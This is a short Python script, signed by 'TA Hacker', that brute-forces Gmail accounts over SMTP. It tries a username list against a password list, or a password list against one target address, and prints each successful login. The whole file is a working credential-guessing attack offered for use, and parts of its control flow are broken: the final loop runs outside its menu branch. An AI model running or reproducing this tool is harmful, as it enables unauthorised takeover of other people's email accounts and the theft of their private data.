#!/usr/bin/python
from __future__ import absolute_import
from __future__ import print_function
from six.moves import input
print('''
	==================================
	|      [Gmail] ==> 3             |
	|--------------------------------|
	| snapchat: flaah999             |
	| CoDeD By TA Hacker (@0xfff0800)|
	|--------------------------------|

	''')
import smtplib
from os import system


smtp = smtplib.SMTP("smtp.gmail.com",587)
smtp.starttls()
smtp.ehlo()

do = input('''
		Choose any number ?
		1 - Email file
		2 - target email
		
		==> ''')

if do == '1':
    user = input("List Of Usernames => ")
    passfile = input("List Of Passwords => ")
    loop_user = open(user, 'r').read().splitlines()
    loop_passfile = open(passfile, 'r').read().splitlines()
    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
    for user in loop_user:
        for passfile in loop_passfile:
            try:
                smtp.login(user, passfile)

                print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % passfile ))
                break;
            except smtplib.SMTPAuthenticationError:
               print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % passfile ))
############
if do == '2':

    smtps = smtplib.SMTP("smtp.gmail.com",587)
    smtps.ehlo()
    smtps.starttls()
    user = input("email : ")
    senha = input("passlist : ")
    senha = open(senha, "r")

headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]



for password in senha:
    try:
        smtps.login(user,password)
        print("\033[1;37mgood -> %s\033[1;m"  % password)
        break;
    except smtplib.SMTPAuthenticationError:
        print("\033[1;31msorry \033[1;m")
